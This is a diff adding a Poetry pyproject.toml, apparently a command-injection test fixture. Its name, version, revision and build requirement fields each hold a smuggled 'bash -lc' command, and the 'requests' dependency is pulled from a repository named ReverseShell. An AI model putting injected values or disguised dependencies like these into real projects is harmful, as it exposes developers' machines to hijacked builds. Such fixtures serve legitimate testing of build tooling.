@@ -1,0 +1,13 @@
+[tool]
+[tool.poetry]
+name = "bash -lc \"echo real_shell_command\""
+version = "bash -lc \"echo real_shell_command\""
+
+[tool.poetry.dependencies]
+[tool.poetry.dependencies.requests]
+git = "https://github.com/mauricelambert/ReverseShell.git"
+rev = "bash -lc \"echo real_shell_command\""
+
+[build-system]
+requires = ["bash -lc \"echo real_shell_command\""]
+build-backend = "poetry.core.masonry.api"
